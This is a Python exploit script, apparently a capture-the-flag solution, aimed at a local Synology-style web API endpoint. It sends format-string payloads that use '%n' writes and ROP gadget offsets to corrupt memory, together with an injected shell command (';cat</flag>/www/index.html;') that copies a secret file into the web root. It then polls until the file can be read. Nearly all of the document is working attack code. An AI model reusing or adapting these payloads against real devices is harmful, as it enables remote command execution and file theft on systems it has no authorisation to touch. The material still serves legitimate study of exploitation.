import requests
from pwn import *

url = "http://127.0.0.1:8080/syno-api/security/info"

header = {"Cookie": "sid=111"}

# 0x0000583c: ldr r3, [fp, #-0xc]; mov r0, r3; sub sp, fp, #4; pop {fp, pc}; 
# 0x000053f4: ldr r3, [r3]; mov r0, r3; add sp, fp, #0; pop {fp}; bx lr; 

pad = 0x450A98 - 0x40A9C0
pad_str = str(pad)
pad_str = pad_str[0] + "%3" + pad_str[1:]

print(pad_str)

j = {
    "%1$p%2%32560c%2$hn%4%3455352c%1%32$naa": "a",
    f"%2%31926c%1$n%{pad_str}c%3%34$naaaa%5$n": "b",
    ";cat</flag>/www/index.html;": "c",
}

while True:
    res = requests.put(url, json=j, headers=header)
    # print(res.text)
    if res.text[20] != " " and res.text[20] != ";":
        addr = int(res.text[24:28], 16) + 0x450000
        print(hex(addr))
        pad = addr - 0x40A9C0
        pad_str = str(pad)
        pad_str = pad_str[0] + "%3" + pad_str[1:]
        break

print(pad_str)

j = {
    "%1$p%2%32560c%2$hn%4%3455352c%1%32$naa": "a",
    f"%2%31926c%1$n%{pad_str}c%3%34$naaaa%5$n": "b",
    ";cat</flag>/www/index.html;": "c",
}

for i in range(100):
    res = requests.put(url, json=j, headers=header)
    if res.text[20] != " " and res.text[20] != ";":
        addr = int(res.text[22:24], 16)
        print(hex(addr))
        if addr == 0x49:
            res = requests.get("http://127.0.0.1:8080/index.html", headers=header)
            if "flag" in res.text:
                print(res.text)
                break
